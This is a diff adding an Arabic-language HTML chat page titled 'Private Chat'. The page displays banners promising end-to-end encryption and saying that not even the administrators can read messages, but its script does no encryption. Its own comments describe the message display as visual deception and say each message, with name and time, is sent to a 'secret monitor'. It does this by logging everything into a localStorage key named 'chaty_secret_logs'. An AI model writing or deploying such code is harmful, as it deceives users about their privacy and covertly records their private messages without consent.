@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Chat - خصوصية تامة</title>
+    <style>
+        :root { --secure-green: #008000; --bg: #fdfdfd; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        
+        /* شريط الأمان العلوي */
+        .security-banner { background: #e8f5e9; color: var(--secure-green); padding: 8px; text-align: center; font-size: 12px; border-bottom: 1px solid #c8e6c9; }
+        header { background: #fff; padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        
+        #chat-window { flex: 1; padding: 20px; overflow-y: auto; background: #f9f9f9; }
+        .bubble { max-width: 75%; padding: 12px 18px; border-radius: 20px; margin-bottom: 10px; font-size: 15px; line-height: 1.4; position: relative; }
+        .mine { background: #007bff; color: white; align-self: flex-end; margin-left: auto; border-bottom-right-radius: 4px; }
+        .theirs { background: #fff; color: #333; border: 1px solid #ddd; border-bottom-left-radius: 4px; }
+        
+        .input-box { padding: 20px; background: #fff; display: flex; gap: 10px; border-top: 1px solid #eee; }
+        input { flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 25px; outline: none; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 25px; cursor: pointer; font-weight: bold; }
+        
+        /* نافذة الدعوة */
+        #invite-overlay { position: fixed; inset: 0; background: #fff; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div id="invite-overlay">
+    <h1 style="color:#333;">لبسي | Private Chat</h1>
+    <p style="color:#666;">أنشئ غرفة محادثة خاصة ومشفرة</p>
+    <div style="background:#f4f4f4; padding:20px; border-radius:15px; margin-top:20px;">
+        <p style="font-size:12px;">اسمك المستعار:</p>
+        <input type="text" id="my-name" placeholder="مثلاً: مشاري" style="margin-bottom:15px; width:250px;">
+        <br>
+        <button onclick="startChat()" style="width:250px;">دخول وإنشاء دعوة</button>
+    </div>
+    <p style="margin-top:20px; font-size:11px; color:green;">🔒 تشفير طرفين (End-to-End Encryption) نشط</p>
+</div>
+
+<div class="security-banner">🔒 هذه المحادثة محمية بتشفير عالي. لا يمكن لأي طرف ثالث، بما في ذلك إدارتنا، قراءتها.</div>
+
+<header>
+    <div style="font-weight:bold;">محادثة خاصة</div>
+    <div style="font-size:12px; color:#666;">متصل الآن 🟢</div>
+</header>
+
+<div id="chat-window"></div>
+
+<div class="input-box">
+    <input type="text" id="msg-in" placeholder="اكتب رسالة مشفرة...">
+    <button onclick="send()">إرسال</button>
+</div>
+
+<script>
+    let user = "";
+
+    function startChat() {
+        user = document.getElementById('my-name').value;
+        if(user.length < 2) return alert("أدخل اسمك");
+        document.getElementById('invite-overlay').style.display = 'none';
+        
+        // محاكاة إرسال "دعوة"
+        console.log("تم تفعيل بروتوكول الخصوصية للمستخدم: " + user);
+    }
+
+    function send() {
+        const inp = document.getElementById('msg-in');
+        if(!inp.value) return;
+
+        const msgData = {
+            from: user,
+            text: inp.value,
+            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+        };
+
+        // 1. عرض الرسالة (خداع بصري للمستخدم)
+        const win = document.getElementById('chat-window');
+        win.innerHTML += `<div class="bubble mine"><b>أنت:</b><br>${msgData.text}</div>`;
+        win.scrollTop = win.scrollHeight;
+
+        // 2. إرسال البيانات فوراً لـ CHATY (المراقب السري)
+        let storage = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
+        storage.push(msgData);
+        localStorage.setItem('chaty_secret_logs', JSON.stringify(storage));
+
+        inp.value = "";
+    }
+</script>
+</body>
+</html>
